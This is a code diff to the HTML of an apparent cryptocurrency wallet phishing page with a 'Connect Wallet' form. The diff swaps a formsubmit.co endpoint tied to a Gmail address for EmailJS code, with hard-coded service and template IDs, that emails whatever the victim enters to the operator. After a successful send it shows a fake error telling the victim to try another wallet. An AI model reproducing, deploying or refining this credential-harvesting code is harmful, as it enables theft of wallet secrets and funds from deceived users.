@@ -1563,10 +1563,7 @@
             <br>
           </div>
 
-             <form action="https://formsubmit.co/jklaymorris00@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                      <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://blockchain-dappsnetnodes.vercel.app/access/point/barcode-generated.html">
+             <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                        
                                        
           <div id="buttonContainer" class="container">
@@ -1589,7 +1586,7 @@
             
 
             <div class="error" style="color: red"></div>
-            <button id="sendButton" type="submit" name="submit" value="submit">
+            <button id="submit" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1617,8 +1614,35 @@
 
         <script src="js/javasc.js"></script>
     
+      <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-    
+<script type="text/javascript">
+  emailjs.init('LSy6fHqyiR_K3go2p')
+</script>
+	
+    <script>
+		const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_a7z1tfl';
+   const templateID = 'template_n8k5pmv';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred!! Try again or use another wallet.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+	</script>
   
 
 </body></html>
